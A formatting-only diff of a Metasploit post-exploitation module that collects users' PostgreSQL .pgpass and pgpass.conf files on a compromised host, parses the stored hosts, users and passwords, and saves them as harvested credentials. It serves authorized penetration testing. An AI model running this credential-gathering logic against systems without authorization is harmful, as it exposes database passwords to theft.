@@ -8,18 +8,21 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Unix
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'          => 'Multi Gather pgpass Credentials',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather pgpass Credentials',
+        'Description' => %q{
           This module will collect the contents of all users' .pgpass or pgpass.conf
           file and parse them for credentials.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Zach Grace <zgrace[at]403labs.com>'],
-      'Platform'      => %w[linux bsd unix osx win],
-      'SessionTypes'  => %w[meterpreter shell]
-    ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Zach Grace <zgrace[at]403labs.com>'],
+        'Platform' => %w[linux bsd unix osx win],
+        'SessionTypes' => %w[meterpreter shell]
+      )
+    )
   end
 
   def run
@@ -28,7 +31,7 @@ class MetasploitModule < Msf::Post
     files = []
     case session.platform
     when 'unix', 'linux', 'bsd', 'osx'
-      files = enum_user_directories.map {|d| d + "/.pgpass"}.select { |f| file?(f) }
+      files = enum_user_directories.map { |d| d + "/.pgpass" }.select { |f| file?(f) }
     when 'windows'
       if session.type != "meterpreter"
         print_error("Only meterpreter sessions are supported on windows hosts")
@@ -64,14 +67,15 @@ class MetasploitModule < Msf::Post
   # Store the creds to
   def parse_creds(f)
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'Postgres Data',
-      'Indent'  => 1,
+      'Header' => 'Postgres Data',
+      'Indent' => 1,
       'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']
     )
 
     read_file(f).each_line do |entry|
       # skip comments
-      next if entry.lstrip[0,1] == "#"
+      next if entry.lstrip[0, 1] == "#"
+
       ip, port, db, user, pass = entry.chomp.split(/:/, 5)
 
       # Fix for some weirdness that happens with backslashes
@@ -88,7 +92,7 @@ class MetasploitModule < Msf::Post
           end
         else
           if c == ":" && bs == true
-            p = "#{p[0,p.length-1]}:"
+            p = "#{p[0, p.length - 1]}:"
           else
             p << c
           end
@@ -135,7 +139,6 @@ class MetasploitModule < Msf::Post
         workspace_id: myworkspace_id
       }
       create_credential_login(login_data)
-
     end
 
     if not cred_table.rows.empty?
